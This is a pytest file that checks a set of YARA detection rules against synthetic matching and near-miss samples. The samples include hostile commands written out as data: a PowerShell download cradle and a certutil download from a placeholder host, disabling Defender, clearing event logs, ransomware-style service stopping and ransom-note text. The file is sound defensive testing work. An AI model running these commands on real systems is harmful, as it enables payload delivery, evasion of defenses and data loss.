"""33.4: a test for each public YARA rule that no test named. For each rule,
an inert synthetic input that has every part of its condition matches, and a
near miss without one part does not. The rules are unchanged; these pin their
current thresholds (benign-corpus questions are owner items M29, M32, S-Y1-4).
Domains are reserved (.invalid); nothing here runs."""

from pathlib import Path

import pytest

from detectors.yara_engine import YARA_AVAILABLE, YaraEngine

pytestmark = pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
RULES = Path(__file__).resolve().parent.parent / "rules"

ONION = "a" * 56 + ".onion"
LNK_HEADER = b"\x4c\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 68
ONE_HEADER = bytes.fromhex("e4525c7b8cd8a74d") + b"\x00" * 24
FDSO = bytes.fromhex("e716e3bd65261145a4c48d4d0b7a9eac")
EXTENSIONS = b" ".join(e.encode() for e in (
    ".docx", ".xlsx", ".pptx", ".pdf", ".jpg", ".sql", ".mdb", ".pst", ".vmdk", ".vhdx",
    ".bak", ".accdb"))
ENCRYPTOR = EXTENSIONS + b" CryptEncrypt CryptGenRandom FindFirstFileW FindNextFileW decrypt readme"

CASES = {
    "PDF_AutoLaunch_Action": (
        b"%PDF-1.4\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>",
        b"%PDF-1.4\n1 0 obj << /Names << /JavaScript 2 0 R >> >>"),         # no /OpenAction, /AA
    "Ransomware_Stops_Services_And_Processes": (
        b"net stop sqlwriter & taskkill /f /im sqlservr.exe /im mysqld.exe /im winword.exe "
        b"/im excel.exe /im outlook.exe",
        b"taskkill /f /im sqlservr.exe /im mysqld.exe /im winword.exe /im excel.exe"),  # 4 targets
    "Ransomware_Safe_Mode_Boot": (
        b"bcdedit /set {default} safeboot minimal",
        b"bcdedit /set {default} bootmenupolicy legacy"),
    "Event_Log_Clearing": (
        b"wevtutil cl security",
        b"wevtutil qe security /c:5 /f:text"),                             # a query
    "Ransomware_Encryptor_Target_Extensions": (
        b"MZ" + b"\x00" * 62 + ENCRYPTOR,
        b"ZM" + b"\x00" * 62 + ENCRYPTOR),                                # not an executable
    "Ransom_Note_Tor_Negotiation": (
        f"Files encrypted. Install Tor Browser, open {ONION}, quote your ID to decrypt.".encode(),
        f"Files encrypted. Open {ONION}, quote your ID to decrypt.".encode()),  # no Tor mention
    "LNK_Shortcut_Runs_Script_Host": (
        LNK_HEADER + "powershell -w hidden".encode("utf-16le"),
        b"\x00" * 76 + "powershell -w hidden".encode("utf-16le")),        # no shell link header
    "HTA_Application_With_Script_Execution": (
        b'<hta:application id="a"/><script>new ActiveXObject("WScript.Shell").Run("x")</script>',
        b'<html><script>new ActiveXObject("WScript.Shell").Run("x")</script></html>'),
    "Script_Encoder_Encoded_Block": (
        b"<script>#@~^AQAAAA==W@#@&AAAAAA==^#~@</script>",
        b"<script>#@~^AQA==</script>"),                                    # too short
    "OneNote_Embedded_Script_Or_Program": (
        ONE_HEADER + FDSO + b"\x00" * 16 + b"invoice.hta",
        b"\x00" * 32 + FDSO + b"\x00" * 16 + b"invoice.hta"),             # not a .one section
    "LOLBin_Download_Command": (
        b"certutil -urlcache -split -f http://example.invalid/a.bin a.bin",
        b"certutil -hashfile a.bin SHA256"),
    "PowerShell_Defender_Tampering": (
        b"Set-MpPreference -DisableRealtimeMonitoring $true",
        b"Get-MpPreference | Select-Object DisableRealtimeMonitoring"),
    "Crypto_Ransom_Extortion_Combo": (
        b"Your files are encrypted. Send the payment in bitcoin within 48 hours or the key is "
        b"lost forever.",
        b"Files are encrypted. Send the payment in bitcoin within 48 hours or the key is "
        b"lost forever."),                                                 # not addressed to "your"
    "PowerShell_Download_Cradle": (
        b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString("
        b"'http://example.invalid/a')\"",
        b"powershell Get-Help Invoke-WebRequest -Examples"),
}


@pytest.fixture(scope="module")
def engine():
    return YaraEngine(rules_dir=str(RULES))


def _rules(engine, tmp_path, data):
    p = tmp_path / "sample.bin"
    p.write_bytes(data)
    return {m.rule for m in engine.scan_file(str(p)).matches}


@pytest.mark.parametrize("rule", sorted(CASES))
def test_the_rule_fires_on_every_part_of_its_condition(engine, tmp_path, rule):
    assert rule in _rules(engine, tmp_path, CASES[rule][0])


@pytest.mark.parametrize("rule", sorted(CASES))
def test_a_near_miss_does_not_fire(engine, tmp_path, rule):
    assert rule not in _rules(engine, tmp_path, CASES[rule][1])


def test_every_public_rule_has_a_test():
    names = {line.split()[1] for p in RULES.glob("*.yar")
             for line in p.read_text(encoding="utf-8").splitlines() if line.startswith("rule ")}
    tests = Path(__file__).parent
    named = {n for n in names
             if any(n in t.read_text(encoding="utf-8") for t in tests.glob("test_*.py"))}
    assert names - named == set()
